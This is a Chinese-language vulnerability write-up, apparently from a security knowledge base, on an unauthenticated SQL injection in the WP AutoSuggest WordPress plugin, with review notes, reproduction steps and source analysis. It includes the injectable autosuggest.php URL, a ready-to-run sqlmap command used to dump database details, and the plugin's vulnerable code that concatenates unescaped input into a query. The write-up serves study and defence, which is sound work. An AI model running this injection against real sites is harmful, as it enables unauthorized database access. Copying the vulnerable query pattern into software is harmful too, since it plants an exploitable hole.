---
source: "hatch 补库批 20260928"
product: "WordPress WP AutoSuggest"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "WordPress Plugin - AutoSuggest sql注入"
prerequisites: "来源所述条件，未列明部分仍待核：plugin vulnerable release unspecified; unauth direct autosuggest.php; PHP5.4.45 tested,5.2.17 failed"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8db5dce61444d7dcde9d4e39"
entity_id: "ve-8db5dce61444d7dcde9d4e39"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：plugin vulnerable release unspecified; unauth direct autosuggest.php; PHP5.4.45 tested,5.2.17 failed

- **事实待核（1）**：影响版本栏空白，虽有EDB45977精确来源仍需提取插件版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：完整代码展示wpas_keys先空格替换再SQL拼接，文章称一点不过滤不精确，应称无SQL安全转义。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：PHP5.2.17失败与5.4.45成功是有价值负结果，不应省略或直接推成全版本PHP边界。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（4）**：无修复版本；SQLmap截图结果缺文本，但独立成因分析完整。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WordPress Plugin - AutoSuggest sql注入

一、漏洞简介
------------

WP
AutoSuggest这款插件在访问者输入关键字时，插件会在提交搜索查询之前通过AJAX请求在网页中显示一些建议。访问者可以通过按Enter继续搜索，或者访问者可以使用键盘箭头直接访问建议的帖子。

二、漏洞影响
------------

三、复现过程
------------

首先我们得进入exploit-db网站上下载这个存在漏洞的版本的插件原始码和本地构建WordPress网站（本地构建WordPress这里就不说了）。下载源码，如下图所示

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId24.png)

下载完成之后，把wp-autosuggest目录直接拖到Wordpress目录的\\wp-content\\plugins\\下。

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId25.png)

接着，登录后台，启用这款插件，如下图所示：

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId26.png)

启用后，退出后台，如下图所示：

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId27.png)

然后根据exploit-db网站上给出的漏洞详情，我们访问下面的URL：

    http://www.0-sec.org/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1

访问后，网页内容如下图所示：

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId28.png)

根据exploit-db网站上给出的漏洞详情，我们也知道了wpas\_keys参数存在注入，于是我们可以使用SQLMAP注入神器，对网站进行注入。SQLMAP命令如下：

    sqlmap.py -u "http://www.0-sec.org/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1*" --technique BT --dbms MYSQL --risk 3 --level 5 --tamper space2comment

一开始，笔者使用的时php5.2.17+Apache的环境，结果复现不了，头疼了半天，如下图：

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId29.png)

后来笔者换了一个php-5.4.45+Apache的环境，就解决了。

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId30.png)

通过SQLMAP，成功获取到服务器的一些信息，如下图所示：

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId31.png)

下图也成功跑出了当前数据库的名称。

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId32.png)

### 漏洞分析

分析WordPress插件的话还是挺容易的。文件和代码也不是很多，用Notepad++就够用啦。进入插件根目录下面就看到了autosuggest\_functions.php、autosuggest.php这两个php文件。

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId34.png)

下面是autosuggest.php文件所有代码：

    <?php
    include 'autosuggest_functions.php';

    $wpas_action = '';
    $wpas_keys = '';
    if(isset($_GET['wpas_action'])) {
        $wpas_action = $_GET['wpas_action'];
    }
    if (isset($_GET['wpas_keys'])) {
        $wpas_keys = $_GET['wpas_keys'];
    }


    if ($wpas_action == 'query') {

        require_once ('../../../wp-config.php');

        header('Content-Type: text/xml');
        echo '<results>';

        global $wpdb;

        $wpas_keys = str_replace(' ','%',$wpas_keys);
        $pageposts = $wpdb->get_results("SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC");
        foreach ($pageposts as $post) {
            setup_postdata($post);
            echo "<rs id=\"";
            the_permalink();
            echo "\" info=\"" . autosuggest_excerpt(apply_filters('the_title', get_the_content())) . "\">";
            the_title();
            echo "</rs>";
        }
        echo '</results>';
        die();
    }

    define('AUTOSUGGEST_DIR', get_option('siteurl') . '/' . PLUGINDIR.'/'.dirname(plugin_basename(__FILE__)));


    function add_autosuggest_css() {
        wp_register_style('autosuggestCSS', AUTOSUGGEST_DIR . '/css/wp_autosuggest.css', null, '1', 'screen');
        wp_enqueue_style('autosuggestCSS');
    }

    function add_autosuggest_js() {
        wp_register_script('autosuggestJS', AUTOSUGGEST_DIR . '/js/wp.autosuggest.js', null, '1');
        wp_enqueue_script('autosuggestJS');
    }

    function add_autosuggest_footer_code() {
    ?>
    <script type="text/javascript">
    var autosuggest_options = {
        script: "<?php echo AUTOSUGGEST_DIR; ?>/autosuggest.php?wpas_action=query&",
        varname: "wpas_keys",
        shownoresults:true,
        noresults:"<?php echo __('No results found.'); ?>",
        timeout:15000,
        callback:autosuggestSelected,
        maxresults: <?php echo get_wpas_option('wpas_maxresults','10'); ?>
    };
    var as = new AutoSuggest('<?php echo get_wpas_option('wpas_input_id','s'); ?>', autosuggest_options);
    function autosuggestSelected(entry) {
        document.location = entry['id'];
    }
    </script>
    <?php
    }

    function add_autosuggest_settings() {
    ?>
    <div class="wrap">

        <?php

            $smsg = "";
            if (isset($_POST['submitoptions'])) {
                if (isset($_POST['wpas_input_id'])) {
                    update_option('wpas_input_id',$_POST['wpas_input_id']);
                }
                if (isset($_POST['wpas_maxresults'])) {
                    update_option('wpas_maxresults',$_POST['wpas_maxresults']);
                }
                ?>

                <div id="message" class="updated fade"><p>WP AutoSuggest settings updated.</p></div>

        <?php } ?>

        <h2>WP AutoSuggest Settings</h2>

        <form action="" method="post">
        <table class="form-table">
            <tr valign="top">
            <th scope="row">Search Input ID</th>
            <td>
            <input type="text" value="<?php echo get_wpas_option('wpas_input_id','s'); ?>" id="wpas_input_id" name="wpas_input_id"/><br/>
            Default value is 's' which is used with the default WordPress theme. 
            </td>
            </tr>
            <tr valign="top">
            <th scope="row">Max Results</th>
            <td>
            <input type="text" value="<?php echo get_wpas_option('wpas_maxresults','10'); ?>" id="wpas_maxresults" name="wpas_maxresults"/><br/>
            Maximum number of suggested results (10 by default).
            </td>
            </tr>
        </table>
        <p class="submit"><input type="submit" name="submitoptions" value="Update Settings" /></p>
        </form>
        </div>
    <?php
    }

    function add_autosuggest_menu_settings() {
        if (function_exists('add_options_page')) {
             add_options_page(
                 "WP AutoSuggest"
                 , "WP AutoSuggest"
                 , 7
                 , basename(__FILE__)
                 , 'add_autosuggest_settings');
        }
    }

    add_action('wp_print_scripts', 'add_autosuggest_js');
    add_action('wp_print_styles', 'add_autosuggest_css');
    add_action('wp_footer', 'add_autosuggest_footer_code');
    add_action('admin_menu', 'add_autosuggest_menu_settings');


    ?>

相信大家没看几行就看出了问题的所在，变量wpas\_keys是直接获取GET中的wpas\_keys。一点都没过滤，并且在下面代码中，变量wpas\_keys也带入数据库中查询了（wpdb是wordpress操作数据库方法），于是SQL注入就产生了。

![](./.resource/WordPressPlugin-AutoSuggestsql注入/media/rId35.png)

四、参考链接
------------

> <https://www.exploit-db.com/exploits/45977>
>
> <https://www.freebuf.com/vuls/191869.html>
